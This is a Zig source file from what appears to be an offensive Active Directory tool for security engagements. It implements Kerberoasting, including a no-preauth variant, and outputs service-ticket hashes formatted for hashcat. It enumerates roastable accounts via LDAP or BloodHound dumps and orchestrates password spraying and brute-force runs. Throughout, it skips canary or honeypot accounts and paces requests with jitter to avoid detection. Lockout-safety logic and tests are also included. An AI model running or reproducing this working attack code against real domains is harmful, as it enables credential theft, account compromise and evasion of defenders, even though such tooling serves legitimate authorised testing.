    const spn = flags.userspn orelse {
        logger.err("C2 (--nopreauth-user) requires a target --userspn <SPN>", .{});
        return 1;
    };
    var session = buildSession(allocator, io, logger, flags, false) orelse return 1;
    defer session.deinit();
    var client = krb5.client.Client.init(allocator, io, &session.config);

    const sam_owned = if (flags.ldap_user != null) resolveSamForSpn(allocator, io, flags, domain, logger, spn) else null;
    defer if (sam_owned) |s| allocator.free(s);
    const label = sam_owned orelse deriveSpnLabel(spn);
    if (sam_owned == null) logger.warning("No LDAP sAMAccountName for the SPN; using label '{s}' (RC4 cracks fine, AES needs the real account name)", .{label});

    var report = report_mod.Report.init(allocator, "kerberoast-c2", domain, session.config.realm, session.config.kdc orelse "dns-srv");
    defer report.deinit();

    logger.info("Credential-less roast (C2): AS-REQ as no-preauth account '{s}' for SPN {s}", .{ npu, spn });
    var rc: u8 = 1;
    switch (client.kerberoastNoPreauth(npu, spn)) {
        .ok => |rt_const| {
            var rt = rt_const;
            defer rt.deinit();
            if (hashutil.tgsToHashcat(allocator, rt.etype, label, rt.crealm, spn, rt.cipher)) |hash| {
                defer allocator.free(hash);
                report.addTgsRoast(label, hash, spn, hashutil.tgsHashcatMode(rt.etype));
                if (hashutil.tgsHashcatMode(rt.etype)) |mode| {
                    logger.notice("[+] {s} (SPN {s}) — TGS hash via no-preauth {s} (hashcat -m {d}):\n{s}", .{ label, spn, npu, mode, hash });
                } else {
                    logger.notice("[+] {s} (SPN {s}) — TGS hash (etype {d}):\n{s}", .{ label, spn, rt.etype, hash });
                }
                rc = 0;
            } else |_| logger.err("couldn't format TGS hash", .{});
        },
        .krb_error => |code| {
            if (code == krb5.iana.error_code.kdc_err_preauth_required) {
                logger.err("[-] {s} requires pre-auth — not usable as a C2 requester (needs DONT_REQUIRE_PREAUTH)", .{npu});
            } else {
                logger.err("[-] C2 failed: {s}", .{krb5.iana.error_code.name(code)});
            }
        },
        .network_error => logger.err("[-] C2: network error reaching the KDC", .{}),
        .parse_error => logger.err("[-] C2: couldn't parse the AS-REP / service ticket", .{}),
    }
    finalizeReport(allocator, io, logger, flags, &report);
    return rc;
}

/// Roast one SPN with the held TGT; log + optionally append the hash. Returns
/// true on success.
/// True if `account` is on the canary list, in which case it must not be
/// touched. Kept next to the roast loops so both call sites use the same rule.
fn canaryBlocks(set: ?opsec.CanarySet, account: []const u8, logger: *Logger) bool {
    const cs = set orelse return false;
    if (!cs.contains(account)) return false;
    logger.warning("[!] {s} - CANARY/honeypot account; skipping (never touched)", .{account});
    return true;
}

/// Apply the OPSEC rate limit + jitter before an outbound KDC request.
/// Used by the paths that do NOT run through the worker pool (kerberoast,
/// etype-probe) — the pool has its own pacing in workers.pace.
fn paceRequest(io: Io, g: *opsec.Governor, delay_ms: u64) void {
    // --delay is the legacy fixed pause and lived only in workers.pace, so it
    // had exactly the same blind spot --noise did: no effect on kerberoast or
    // etype-probe. Honour it here when no governor pacing applies.
    if (g.isNoop()) {
        if (delay_ms == 0) return;
        const dt: Io.Timeout = .{ .duration = .{ .raw = Io.Duration.fromMilliseconds(@intCast(delay_ms)), .clock = .awake } };
        dt.sleep(io) catch {};
        return;
    }
    const ms = g.reserve(Io.Timestamp.now(io, .awake).toMilliseconds()) + delay_ms;
    if (ms == 0) return;
    const t: Io.Timeout = .{ .duration = .{ .raw = Io.Duration.fromMilliseconds(@intCast(ms)), .clock = .awake } };
    t.sleep(io) catch {};
}

fn roastOne(
    allocator: Allocator,
    client: *krb5.client.Client,
    tgt: krb5.client.Tgt,
    logger: *Logger,
    label: []const u8,
    spn: []const u8,
    hash_writer: *?Io.File.Writer,
    hash_pos: *u64,
    report: ?*report_mod.Report,
) bool {
    switch (client.kerberoast(tgt, spn)) {
        .ok => |rt_const| {
            var rt = rt_const;
            defer rt.deinit();
            const hash = hashutil.tgsToHashcat(allocator, rt.etype, label, rt.crealm, spn, rt.cipher) catch {
                logger.err("[-] {s}: couldn't format TGS hash", .{label});
                return false;
            };
            defer allocator.free(hash);
            if (report) |r| r.addTgsRoast(label, hash, spn, hashutil.tgsHashcatMode(rt.etype));
            if (hashutil.tgsHashcatMode(rt.etype)) |mode| {
                logger.notice("[+] {s} (SPN {s}) — TGS hash (hashcat -m {d}):\n{s}", .{ label, spn, mode, hash });
            } else {
                logger.notice("[+] {s} (SPN {s}) — TGS hash (etype {d}):\n{s}", .{ label, spn, rt.etype, hash });
            }
            if (hash_writer.*) |*w| {
                w.pos = hash_pos.*;
                // A swallowed failure here loses a CAPTURED, crackable hash —
                // the whole point of the run — with no sign to the operator.
                w.interface.print("{s}\n", .{hash}) catch {
                    logger.err("[!] captured a hash for {s} but could NOT write it to the hash file — it is only in the console output above and the -o report.", .{label});
                };
                hash_pos.* += hash.len + 1;
            }
            return true;
        },
        .krb_error => |code| {
            logger.warning("[-] {s} (SPN {s}): KDC error {s}", .{ label, spn, krb5.iana.error_code.name(code) });
            return false;
        },
        .network_error => {
            logger.err("[-] {s} (SPN {s}): network error reaching the KDC", .{ label, spn });
            return false;
        },
        .parse_error => {
            logger.warning("[-] {s} (SPN {s}): couldn't parse the TGS-REP", .{ label, spn });
            return false;
        },
    }
}

/// Resolve the sAMAccountName that owns `spn` via an LDAP search. OWNERSHIP:
/// caller frees the returned string. Returns null if LDAP is unavailable or the
/// SPN isn't found.
fn resolveSamForSpn(allocator: Allocator, io: Io, flags: Flags, domain: []const u8, logger: *Logger, spn: []const u8) ?[]u8 {
    var lc: ldap.Client = undefined;
    if (!ldapConnectBind(allocator, io, flags, domain, logger, &lc)) return null;
    defer lc.deinit();
    const base = ldap.baseDnFromDomain(allocator, domain) catch return null;
    defer allocator.free(base);
    const filt = ldap.filterEquality(allocator, "servicePrincipalName", spn) catch return null;
    defer allocator.free(filt);
    const attrs = [_][]const u8{"sAMAccountName"};
    var res = lc.search(base, .whole_subtree, filt, &attrs) catch return null;
    defer res.deinit();
    if (res.entries.len == 0) return null;
    const sam = res.entries[0].first("sAMAccountName") orelse return null;
    return allocator.dupe(u8, sam) catch null;
}

/// Best-effort readable label for a `--userspn` target: the host short-name from
/// "service/host[:port]/...". Falls back to the whole SPN.
fn deriveSpnLabel(spn: []const u8) []const u8 {
    const after = if (std.mem.indexOfScalar(u8, spn, '/')) |s| spn[s + 1 ..] else return spn;
    const host = if (std.mem.indexOfScalar(u8, after, '/')) |s| after[0..s] else after;
    const short = if (std.mem.indexOfAny(u8, host, ".:")) |s| host[0..s] else host;
    return if (short.len > 0) short else spn;
}

/// Enumerate domain users via LDAP, flagging disabled / SPN (kerberoastable) /
/// no-preauth (AS-REP-roastable) accounts. With `-o`, writes a bare user list.
fn runLdapenum(allocator: Allocator, io: Io, flags: Flags) u8 {
    // Offline source: ingest a BloodHound dump instead of querying LDAP.
    if (flags.bloodhound) |bh_path| return runBloodhoundEnum(allocator, io, flags, bh_path);

    const domain = flags.domain orelse {
        printErr(io, "domain must not be empty (use -d/--domain)\n", .{});
        return 1;
    };
    var logger = Logger.init(io, flags.verbose, null) catch return 1;
    defer logger.deinit();

    var client: ldap.Client = undefined;
    if (!ldapConnectBind(allocator, io, flags, domain, &logger, &client)) return 1;
    defer client.deinit();

    const base = ldap.baseDnFromDomain(allocator, domain) catch return 1;
    defer allocator.free(base);
    // sAMAccountType 805306368 = normal user accounts (excludes computers/groups/trusts).
    const filter = ldap.filterEquality(allocator, "sAMAccountType", "805306368") catch return 1;
    defer allocator.free(filter);
    const attrs = [_][]const u8{ "sAMAccountName", "userAccountControl", "servicePrincipalName", "badPwdCount", "description" };

    var result = client.search(base, .whole_subtree, filter, &attrs) catch {
        logger.err("LDAP search failed", .{});
        return 1;
    };
    defer result.deinit();

    // Optional working-list output file (bare sAMAccountNames).
    var out_file: ?Io.File = null;
    var out_writer: ?Io.File.Writer = null;
    var out_buf: [4096]u8 = undefined;
    if (flags.output) |path| {
        // Enumerated domain accounts are engagement data too — same owner-only
        // treatment as the credential outputs (see util/secret_file.zig).
        out_file = secret_file.create(io, path, .{ .truncate = true }) catch null;
        if (out_file) |f| out_writer = f.writerStreaming(io, &out_buf);
    }
    defer if (out_file) |f| f.close(io);

    var total: u32 = 0;
    var disabled_n: u32 = 0;
    var spn_n: u32 = 0;
    var nopreauth_n: u32 = 0;
    for (result.entries) |e| {
        const sam = e.first("sAMAccountName") orelse continue;
        const uacv: u32 = if (e.first("userAccountControl")) |s| (std.fmt.parseInt(u32, s, 10) catch 0) else 0;
        const is_disabled = (uacv & ldap.uac.accountdisable) != 0;
        const is_nopreauth = (uacv & ldap.uac.dont_require_preauth) != 0;
        const spns = e.all("servicePrincipalName");
        if (flags.exclude_disabled and is_disabled) continue;

        total += 1;
        if (is_disabled) disabled_n += 1;
        if (spns.len > 0) spn_n += 1;
        if (is_nopreauth) nopreauth_n += 1;

        const badpwd: u32 = if (e.first("badPwdCount")) |s| (std.fmt.parseInt(u32, s, 10) catch 0) else 0;
        var fbuf: [256]u8 = undefined;
        var fb = std.Io.Writer.fixed(&fbuf);
        if (is_disabled) fb.writeAll(" [DISABLED]") catch {};
        if (is_nopreauth) fb.writeAll(" [NO-PREAUTH/AS-REP-roastable]") catch {};
        if (spns.len > 0) fb.print(" [SPN x{d} -> kerberoastable]", .{spns.len}) catch {};
        if (badpwd > 0) fb.print(" [badPwdCount={d}]", .{badpwd}) catch {};
        logger.notice("[+] {s}@{s}{s}", .{ sam, domain, fb.buffered() });

        if (out_writer) |*w| {
            w.interface.print("{s}\n", .{sam}) catch {};
        }
    }
    if (out_writer) |*w| w.interface.flush() catch {};
    if (flags.output) |path| logger.info("Wrote {d} usernames to {s}", .{ total, path });

    logger.info("Done! Enumerated {d} users ({d} disabled, {d} with SPN, {d} AS-REP-roastable)", .{ total, disabled_n, spn_n, nopreauth_n });
    return 0;
}

/// Offline equivalent of `ldapenum`: ingest a BloodHound users dump (a
/// users.json file, a directory containing one, or a SharpHound .zip) and print
/// the same enriched list — disabled / SPN / no-preauth — with no network and no
/// credentials. With `-o`, writes the bare working list.
fn runBloodhoundEnum(allocator: Allocator, io: Io, flags: Flags, path: []const u8) u8 {
    var logger = Logger.init(io, flags.verbose, null) catch return 1;
    defer logger.deinit();
    logger.info("BloodHound: ingesting {s} (offline)", .{path});

    var users = bloodhound.load(allocator, io, path) catch |err| {
        logger.err("BloodHound ingest failed: {s}", .{@errorName(err)});
        return 1;
    };
    defer users.deinit();
    if (users.meta_version) |v| {
        logger.info("BloodHound dump: schema v{d}, {d} record(s)", .{ v, users.meta_count orelse users.items.len });
    }

    // Optional working-list output file (bare sAMAccountNames).
    var out_file: ?Io.File = null;
    var out_writer: ?Io.File.Writer = null;
    var out_buf: [4096]u8 = undefined;
    if (flags.output) |p| {
        out_file = secret_file.create(io, p, .{ .truncate = true }) catch null;
        if (out_file) |f| out_writer = f.writerStreaming(io, &out_buf);
    }
    defer if (out_file) |f| f.close(io);

    var total: u32 = 0;
    var disabled_n: u32 = 0;
    var spn_n: u32 = 0;
    var nopreauth_n: u32 = 0;
    for (users.items) |u| {
        if (flags.exclude_disabled and !u.enabled) continue;
        total += 1;
        if (!u.enabled) disabled_n += 1;
        if (u.has_spn) spn_n += 1;
        if (u.dont_require_preauth) nopreauth_n += 1;

        var fbuf: [256]u8 = undefined;
        var fb = std.Io.Writer.fixed(&fbuf);
        if (!u.enabled) fb.writeAll(" [DISABLED]") catch {};
        if (u.dont_require_preauth) fb.writeAll(" [NO-PREAUTH/AS-REP-roastable]") catch {};
        if (u.has_spn) {
            if (u.spn_count > 0) fb.print(" [SPN x{d} -> kerberoastable]", .{u.spn_count}) catch {} else fb.writeAll(" [SPN -> kerberoastable]") catch {};
        }
        if (flags.domain) |d| {
            logger.notice("[+] {s}@{s}{s}", .{ u.sam, d, fb.buffered() });
        } else {
            logger.notice("[+] {s}{s}", .{ u.sam, fb.buffered() });
        }
        if (out_writer) |*w| w.interface.print("{s}\n", .{u.sam}) catch {};
    }
    if (out_writer) |*w| w.interface.flush() catch {};
    if (flags.output) |p| logger.info("Wrote {d} usernames to {s}", .{ total, p });

    logger.info("Done! Ingested {d} users ({d} disabled, {d} with SPN, {d} AS-REP-roastable)", .{ total, disabled_n, spn_n, nopreauth_n });
    return 0;
}

/// Connect + simple-bind an LDAP client per the flags (UPN bind if creds given,
/// else anonymous). On success `client` is initialised; caller calls deinit.
fn ldapConnectBind(allocator: Allocator, io: Io, flags: Flags, domain: []const u8, logger: *Logger, client: *ldap.Client) bool {
    const target = flags.ldap_server orelse (flags.dc orelse {
        logger.err("LDAP needs --ldap-server or --dc to reach the directory", .{});
        return false;
    });
    const hp = splitHostPort(target, 389);
    logger.info("LDAP: connecting to {s}:{d}", .{ hp.host, hp.port });
    // No LDAPS/StartTLS support: a simple bind puts the supplied domain password
    // on the wire in cleartext. On an engagement that is the CLIENT'S credential
    // crossing the client's own network, where capture is a realistic threat —
    // so say so rather than letting it look encrypted.
    if (flags.ldap_pass != null) {
        logger.warning("[!] LDAP bind is CLEARTEXT (no LDAPS/StartTLS support): '{s}' and its password cross the network unencrypted to {s}:{d}. Prefer a host you control, or skip the LDAP-backed options.", .{ flags.ldap_user orelse "<user>", hp.host, hp.port });
    }
    client.connect(io, allocator, hp.host, hp.port) catch {
        logger.err("LDAP connect failed to {s}:{d}", .{ hp.host, hp.port });
        return false;
    };
    var name_buf: [512]u8 = undefined;
    const bind_name: []const u8 = if (flags.ldap_user) |u|
        (if (std.mem.indexOfScalar(u8, u, '@') != null) u else std.fmt.bufPrint(&name_buf, "{s}@{s}", .{ u, domain }) catch u)
    else
        "";
    const rc = client.bind(bind_name, flags.ldap_pass orelse "") catch {
        logger.err("LDAP bind error (network/protocol)", .{});
        client.deinit();
        return false;
    };
    if (rc != 0) {
        logger.err("LDAP bind failed (resultCode {d}) — check creds or try --ldap-user/--ldap-pass", .{rc});
        client.deinit();
        return false;
    }
    logger.info("LDAP bind OK as {s}", .{if (bind_name.len > 0) bind_name else "(anonymous)"});
    return true;
}

/// Fetch the most restrictive AD lockout policy (default domain + PSOs).
/// Returns null on failure. The returned `source` is a static label.
fn fetchPolicy(allocator: Allocator, io: Io, client: *ldap.Client, domain: []const u8, logger: *Logger) ?policy_mod.LockoutPolicy {
    _ = io;
    const base = ldap.baseDnFromDomain(allocator, domain) catch return null;
    defer allocator.free(base);
    const dp = policy_mod.fetchDomainPolicy(client, allocator, base) catch {
        logger.warning("--policy-fetch: could not read domain lockout policy", .{});
        return null;
    };
    var all: std.ArrayList(policy_mod.LockoutPolicy) = .empty;
    defer all.deinit(allocator);
    all.append(allocator, dp) catch return dp;
    const psos = policy_mod.fetchPSOs(client, allocator, base) catch &.{};
    defer {
        for (psos) |p| allocator.free(p.source);
        if (psos.len > 0) allocator.free(psos);
    }
    all.appendSlice(allocator, psos) catch {};
    const best = policy_mod.mostRestrictive(all.items);
    const from_domain = best.threshold == dp.threshold and best.observation_window_min == dp.observation_window_min;
    return .{
        .threshold = best.threshold,
        .observation_window_min = best.observation_window_min,
        .duration_min = best.duration_min,
        .source = if (from_domain) "domain default" else "fine-grained PSO",
    };
}

/// Pre-read each user's badPwdCount over LDAP and seed the windowed budget so
/// bad attempts already on the counter shrink the first window.
fn seedBadPwdCounts(allocator: Allocator, io: Io, client: *ldap.Client, budget: *budget_mod.Budget, domain: []const u8, logger: *Logger) void {
    const base = ldap.baseDnFromDomain(allocator, domain) catch return;
    defer allocator.free(base);
    const filter = ldap.filterEquality(allocator, "sAMAccountType", "805306368") catch return;
    defer allocator.free(filter);
    const attrs = [_][]const u8{ "sAMAccountName", "badPwdCount" };
    var res = client.search(base, .whole_subtree, filter, &attrs) catch {
        logger.warning("--check-badpwdcount: LDAP search failed", .{});
        return;
    };
    defer res.deinit();
    const now = Io.Timestamp.now(io, .real).toSeconds();
    var seeded: u32 = 0;
    for (res.entries) |e| {
        const sam = e.first("sAMAccountName") orelse continue;
        const bpc: u32 = if (e.first("badPwdCount")) |s| (std.fmt.parseInt(u32, s, 10) catch 0) else 0;
        if (bpc > 0) {
            budget.seedBadPwdCount(sam, bpc, now) catch {};
            seeded += 1;
        }
    }
    logger.info("--check-badpwdcount: seeded budget from badPwdCount for {d} account(s)", .{seeded});
}

const HostPort = struct { host: []const u8, port: u16 };

/// Split "host", "host:port" or "[ipv6]:port"; defaults to `default_port`.
fn splitHostPort(s: []const u8, default_port: u16) HostPort {
    if (s.len > 0 and s[0] == '[') {
        if (std.mem.indexOfScalar(u8, s, ']')) |close| {
            const host = s[1..close];
            if (close + 2 <= s.len and s[close + 1] == ':') {
                return .{ .host = host, .port = std.fmt.parseInt(u16, s[close + 2 ..], 10) catch default_port };
            }
            return .{ .host = host, .port = default_port };
        }
    }
    if (std.mem.lastIndexOfScalar(u8, s, ':')) |idx| {
        if (std.mem.count(u8, s, ":") == 1) {
            return .{ .host = s[0..idx], .port = std.fmt.parseInt(u16, s[idx + 1 ..], 10) catch default_port };
        }
    }
    return .{ .host = s, .port = default_port };
}

// ===========================================================================
// Shared run loop
// ===========================================================================

/// Build the session, read the input, run the worker pool, print the summary.
/// When `campaign` is set, attempts are logged to an NDJSON state file and
/// already-tried (realm,user,password) combos are skipped, so the run resumes.
/// Work source for `runPool`: a file/stdin path, or a pre-built line list the
/// caller owns (e.g. the spray matrix).
const PoolInput = union(enum) {
    path: []const u8,
    prebuilt: []const []const u8,
};

/// Explicit "X passwords across Y users" counts for the status block (the flat
/// line list can't always express these). null => derive from the mode.
const SprayDims = struct { users: usize, passwords: usize };

/// How `planLockoutConcurrency` decided the worker count / trip point.
const ClampReason = enum { unchanged, safe, adjusted };

/// Worker count + panic-stop trip point for a run (see planLockoutConcurrency).
const LockoutPlan = struct { threads: usize, panic_trip: u32, reason: ClampReason, from: usize };

/// Plan concurrency + the panic-stop trip point so a password-guessing run can
/// never lock more than --panic-after accounts, even with requests in flight.
/// Capping threads at `panic_after` bounds how many attempts can be on the wire;
/// tripping the stop early — at `panic_after - (threads-1)` — means that even if
/// every in-flight attempt locks, the total still lands on `panic_after` (it may
/// stop a hair under). With one worker the trip equals `panic_after` (exact cap).
/// --safe runs a single thread (it aborts on the first lockout). Enumeration sends
/// no passwords and can't lock accounts, so it is never clamped.
fn planLockoutConcurrency(want: usize, safe: bool, panic_after: u32, is_login: bool) LockoutPlan {
    if (!is_login) return .{ .threads = want, .panic_trip = panic_after, .reason = .unchanged, .from = want };
    if (safe) return .{ .threads = 1, .panic_trip = 1, .reason = if (want <= 1) .unchanged else .safe, .from = want };
    const cap: usize = @max(1, panic_after);
    const threads = @max(@as(usize, 1), @min(want, cap));
    const trip: u32 = @intCast(@max(@as(usize, 1), cap - (threads - 1)));
    const adjusted = threads != want or trip < panic_after;
    return .{ .threads = threads, .panic_trip = trip, .reason = if (adjusted) .adjusted else .unchanged, .from = want };
}

test "planLockoutConcurrency caps threads and trips early to honour --panic-after" {
    const t = std.testing;
    // Enumeration: never clamped; no lockouts possible anyway.
    {
        const p = planLockoutConcurrency(10, false, 3, false);
        try t.expectEqual(@as(usize, 10), p.threads);
        try t.expectEqual(ClampReason.unchanged, p.reason);
    }
    // Safe mode: one thread, trips on the first lockout.
    {
        const p = planLockoutConcurrency(10, true, 3, true);
        try t.expectEqual(@as(usize, 1), p.threads);
        try t.expectEqual(@as(u32, 1), p.panic_trip);
        try t.expectEqual(ClampReason.safe, p.reason);
    }
    // Single worker: exact cap (trip == panic_after), no warning.
    {
        const p = planLockoutConcurrency(1, false, 3, true);
        try t.expectEqual(@as(usize, 1), p.threads);
        try t.expectEqual(@as(u32, 3), p.panic_trip);
        try t.expectEqual(ClampReason.unchanged, p.reason);
    }
    // want > panic_after: threads capped to panic_after, trip drops to 1.
    {
        const p = planLockoutConcurrency(10, false, 3, true);
        try t.expectEqual(@as(usize, 3), p.threads);
        try t.expectEqual(@as(u32, 1), p.panic_trip);
        try t.expectEqual(ClampReason.adjusted, p.reason);
    }
    // want < panic_after: threads kept, trip = panic_after - (threads-1).
    {
        const p = planLockoutConcurrency(2, false, 3, true);
        try t.expectEqual(@as(usize, 2), p.threads);
        try t.expectEqual(@as(u32, 2), p.panic_trip);
        try t.expectEqual(ClampReason.adjusted, p.reason);
    }
    // Large panic-after: threads stay, trip set so the worst case lands on the cap.
    {
        const p = planLockoutConcurrency(10, false, 50, true);
        try t.expectEqual(@as(usize, 10), p.threads);
        try t.expectEqual(@as(u32, 41), p.panic_trip);
    }
    // Invariant across a range: trip + (threads-1) never exceeds panic_after, i.e.
    // even if every in-flight attempt locks, the total stays within the cap.
    var w: usize = 1;
    while (w <= 12) : (w += 1) {
        var pa: u32 = 1;
        while (pa <= 8) : (pa += 1) {
            const p = planLockoutConcurrency(w, false, pa, true);
            try t.expect(p.threads >= 1 and p.threads <= w);
            try t.expect(@as(usize, p.panic_trip) + (p.threads - 1) <= @as(usize, pa));
        }
    }
}

/// Free a `plannedAttemptsPerUser` map. Its keys are OWNED canonical copies, so
/// `map.deinit()` alone leaks them.
fn freePlannedKeys(allocator: Allocator, map: *std.StringHashMap(u32)) void {
    var kit = map.keyIterator();
    while (kit.next()) |k| allocator.free(k.*);
    map.deinit();
}

/// Collapse work items that would send the SAME password to the SAME AD account.
///
/// Duplicate and mixed-case entries are routine in real user lists — concatenated
/// exports, hand-merged files, `Administrator` next to `administrator`. Left in
/// place, every duplicate spends another of that account's bad-password budget
/// for ZERO new information. The per-attempt dedup index cannot save us here:
/// with several workers the duplicates run concurrently and all pass the
/// "already tried?" check before any of them records (measured on Windows AD —
/// three spellings of one account sent three real guesses and drove badPwdCount
/// 0 -> 3, versus 0 -> 1 single-threaded). Collapsing the list up front is
/// deterministic and race-free.
///
/// Order is preserved, so the lockout-safe password-major spray ordering is
/// untouched. Returns a newly allocated slice the caller owns, or null if there
/// was nothing to drop (use the original).
fn dedupeWorkItems(allocator: Allocator, lines: []const []const u8, mode: workers.Mode) ?[]const []const u8 {
    var seen = std.StringHashMap(void).init(allocator);
    defer {
        var kit = seen.keyIterator();
        while (kit.next()) |k| allocator.free(k.*);
        seen.deinit();
    }
    var out: std.ArrayList([]const u8) = .empty;
    errdefer out.deinit(allocator);

    for (lines) |line| {
        // Identity of the work this line represents. Usernames are canonicalised
        // (AD is case-insensitive); passwords are NOT (they are case-sensitive,
        // and collapsing `Summer26!` into `summer26!` would drop a real guess).
        var kbuf: [budget_mod.account_key_max]u8 = undefined;
        const id: []const u8 = switch (mode) {
            .enumerate, .spray, .spray_user_as_pass => blk: {
                const u = username_util.formatUsername(line) catch break :blk line;
                break :blk budget_mod.accountKey(&kbuf, u);
            },
            // Each line is a password for one fixed user: identity is the password.
            .bruteuser => line,
            .bruteforce => blk: {
                const c = username_util.formatComboLine(line) catch break :blk line;
                const u = budget_mod.accountKey(&kbuf, c.username);
                break :blk std.fmt.allocPrint(allocator, "{s}:{s}", .{ u, c.password }) catch break :blk line;
            },
        };
        const owned_id = allocator.dupe(u8, id) catch {
            if (mode == .bruteforce and id.ptr != line.ptr) allocator.free(id);
            out.deinit(allocator);
            return null; // can't dedupe safely: run the list as-is
        };
        if (mode == .bruteforce and id.ptr != line.ptr) allocator.free(id);
        const gop = seen.getOrPut(owned_id) catch {
            allocator.free(owned_id);
            out.deinit(allocator);
            return null;
        };
        if (gop.found_existing) {
            allocator.free(owned_id); // duplicate work: drop this line
            continue;
        }
        out.append(allocator, line) catch {
            out.deinit(allocator);
            return null;
        };
    }

    if (out.items.len == lines.len) {
        out.deinit(allocator);
        return null; // nothing dropped
    }
    return out.toOwnedSlice(allocator) catch null;
}

test "dedupeWorkItems collapses one AD account spelled several ways" {
    const a = std.testing.allocator;
    // Spray: three spellings of ONE account plus a genuine second account.
    {
        const lines = [_][]const u8{ "arya.stark", "Arya.Stark", "ARYA.STARK", "hodor" };
        const out = dedupeWorkItems(a, &lines, .{ .spray = "pw" }).?;
        defer a.free(out);
        try std.testing.expectEqual(@as(usize, 2), out.len);
        try std.testing.expectEqualStrings("arya.stark", out[0]); // first spelling wins
        try std.testing.expectEqualStrings("hodor", out[1]);
    }
    // Combos: same account+password collapses; a different password does not.
    {
        const lines = [_][]const u8{ "bob:p1", "Bob:p1", "bob:p2" };
        const out = dedupeWorkItems(a, &lines, .bruteforce).?;
        defer a.free(out);
        try std.testing.expectEqual(@as(usize, 2), out.len);
        try std.testing.expectEqualStrings("bob:p1", out[0]);
        try std.testing.expectEqualStrings("bob:p2", out[1]);
    }
    // Passwords are case-SENSITIVE: these are two distinct guesses, keep both.
    {
        const lines = [_][]const u8{ "Summer2026!", "summer2026!" };
        try std.testing.expectEqual(@as(?[]const []const u8, null), dedupeWorkItems(a, &lines, .{ .bruteuser = "bob" }));
    }
    // Nothing to drop => null (caller keeps the original slice).
    {
        const lines = [_][]const u8{ "a", "b" };
        try std.testing.expectEqual(@as(?[]const []const u8, null), dedupeWorkItems(a, &lines, .{ .spray = "pw" }));
    }
}

/// The largest number of passwords any single account is scheduled for in a
/// `username:password` combo list. Drives the auto-promotion to a paced
/// campaign. Falls back to `lines.len` (the worst case: every line is the same
/// user) if the map can't be built, so a failure here can only be conservative.
fn maxCombosPerUser(allocator: Allocator, lines: []const []const u8) usize {
    // The canonical key is built in a scratch buffer whose lifetime ends with
    // the loop iteration, so it must be COPIED before the map keeps it — a map
    // holding pointers into a reused stack buffer is undefined behaviour, and
    // this map decides whether a run gets lockout pacing at all. The arena owns
    // the copies for exactly as long as the map does.
    var arena_state = std.heap.ArenaAllocator.init(allocator);
    defer arena_state.deinit();
    const arena = arena_state.allocator();

    var counts = std.StringHashMap(usize).init(arena);
    var max: usize = 0;
    for (lines) |line| {
        if (line.len == 0) continue;
        const combo = username_util.formatComboLine(line) catch continue;
        var kbuf: [budget_mod.account_key_max]u8 = undefined;
        const key = budget_mod.accountKey(&kbuf, combo.username);
        const gop = counts.getOrPut(key) catch return lines.len;
        if (!gop.found_existing) {
            gop.key_ptr.* = arena.dupe(u8, key) catch return lines.len;
            gop.value_ptr.* = 0;
        }
        gop.value_ptr.* += 1;
        if (gop.value_ptr.* > max) max = gop.value_ptr.*;
    }
    return max;
}

test "maxCombosPerUser counts DISTINCT accounts separately (stack-key aliasing)" {
    const a = std.testing.allocator;
    // Three DIFFERENT accounts, one password each => the busiest account has 1.
    // Equal-length names so any stack-buffer reuse aliases them exactly.
    const lines = [_][]const u8{ "aaa:p1", "bbb:p2", "ccc:p3" };
    try std.testing.expectEqual(@as(usize, 1), maxCombosPerUser(a, &lines));
}

test "maxCombosPerUser finds the busiest account in a combo list" {
    const a = std.testing.allocator;
    // 3 passwords for alice (two spellings of the SAME AD account), 1 for bob.
    const lines = [_][]const u8{ "alice:p1", "Alice:p2", "bob:p1", "alice:p3" };
    try std.testing.expectEqual(@as(usize, 3), maxCombosPerUser(a, &lines));
    // Malformed lines are ignored, not counted.
    const messy = [_][]const u8{ "nocolon", "", "bob:p1" };
    try std.testing.expectEqual(@as(usize, 1), maxCombosPerUser(a, &messy));
}

/// Per target user, how many NEW password attempts this run will make (combos
/// already recorded in the shared log are skipped unless --retry, mirroring the
/// worker's dedup). Keys BORROW from `lines` (valid for the run); caller owns the
/// map. Drives the cross-run collision check.
fn plannedAttemptsPerUser(
    allocator: Allocator,
    lines: []const []const u8,
    mode: workers.Mode,
    dedup: ?*dedup_mod.Dedup,
    realm: []const u8,
    retry: bool,
) std.StringHashMap(u32) {
    var map = std.StringHashMap(u32).init(allocator);
    const Counter = struct {
        m: *std.StringHashMap(u32),
        d: ?*dedup_mod.Dedup,
        realm: []const u8,
        retry: bool,
        fn add(self: @This(), user: []const u8, pw: []const u8) void {
            if (user.len == 0) return;
            if (!self.retry) {
                if (self.d) |dd| if (dd.contains(self.realm, user, pw)) return;
            }
            // Canonical key: `Alice` and `alice` are ONE AD account, so counting
            // them separately makes this safety check UNDER-estimate the
            // per-user attempts and stay silent about a genuine lockout risk.
            // The buffer is per-call, so the map must own its copy of the key.
            var kbuf: [budget_mod.account_key_max]u8 = undefined;
            const key = budget_mod.accountKey(&kbuf, user);
            const gop = self.m.getOrPut(key) catch return;
            if (!gop.found_existing) {
                gop.key_ptr.* = self.m.allocator.dupe(u8, key) catch {
                    _ = self.m.remove(key);
                    return;
                };
                gop.value_ptr.* = 0;
            }
            gop.value_ptr.* += 1;
        }
    };
    const c = Counter{ .m = &map, .d = dedup, .realm = realm, .retry = retry };
    switch (mode) {
        .enumerate => {},
        .spray => |pw| for (lines) |line| {
            const u = username_util.formatUsername(line) catch continue;
            c.add(u, pw);
        },
        .spray_user_as_pass => for (lines) |line| {
            const u = username_util.formatUsername(line) catch continue;
            c.add(u, u);
        },
        .bruteuser => |u| for (lines) |line| c.add(u, line),
        .bruteforce => for (lines) |line| {
            if (line.len == 0) continue;
            const combo = username_util.formatComboLine(line) catch continue;
            c.add(combo.username, combo.password);
        },
    }
    return map;
}

/// Pre-spray cross-run lockout safeguard. The shared per-realm log records every
/// run's attempts, so a second (unaware) operator's spray, or a recent prior one,
/// is visible here. If adding THIS run's new attempts to what a target user
/// already has in the lockout window could reach `threshold`, warn and confirm.
/// Returns true to proceed. -y/--yes bypasses; no interactive TTY => refuse.
fn collisionCheckOk(
    allocator: Allocator,
    io: Io,
    logger: *Logger,
    flags: Flags,
    lines: []const []const u8,
    mode: workers.Mode,
    dedup: ?*dedup_mod.Dedup,
    budget: *budget_mod.Budget,
    realm: []const u8,
    domain: []const u8,
    threshold: u32,
    window_min: u32,
) bool {
    var planned = plannedAttemptsPerUser(allocator, lines, mode, dedup, realm, flags.retry);
    defer freePlannedKeys(allocator, &planned);
    const now = Io.Timestamp.now(io, .real).toSeconds();

    var at_risk: u32 = 0;
    var worst_user: []const u8 = "";
    var worst_recent: usize = 0;
    var worst_plan: u32 = 0;
    var worst_ago_min: i64 = 0;
